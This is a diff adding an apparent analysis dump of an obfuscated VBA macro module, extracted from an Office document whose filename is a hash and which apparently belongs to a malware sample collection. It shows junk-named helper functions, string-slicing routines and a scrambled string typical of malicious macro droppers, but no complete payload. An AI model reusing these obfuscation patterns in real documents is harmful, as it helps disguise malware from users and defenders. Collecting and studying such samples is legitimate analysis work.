@@ -1,0 +1,34 @@
+Filename     : ./macros/5e7a1ed5f9a1fbc9d7148fbc28a379dc0067508844b6d342084d26b75c995d4f
+OLE stream   : Macros/VBA/ACCEPTED
+VBA filename : ACCEPTED.bas
+----------------------------------------
+Attribute VB_Name = "ACCEPTED"
+Function accessruy()
+accessruy = nake3344
+End Function
+
+Function nake3344()
+nake3344 = guest1974(xytroftu.buggerme)
+End Function
+
+Function crack_serial()
+crack_serial = xytroftu.waswas
+End Function
+
+Function luctynbu()
+luctynbu = gogoose1.xaza1111
+End Function
+
+Function chicojosie(cleissin, wambapvo)
+linksenior = Left(cleissin, wambapvo)
+chicojosie = legendagp(linksenior)
+End Function
+
+Function legendagp(plankpin)
+legendagp = Right(plankpin, 1)
+End Function
+
+Function portroas()
+portroas = "/usgc;]x]/lEmaQR/aE.]/"
+End Function
+
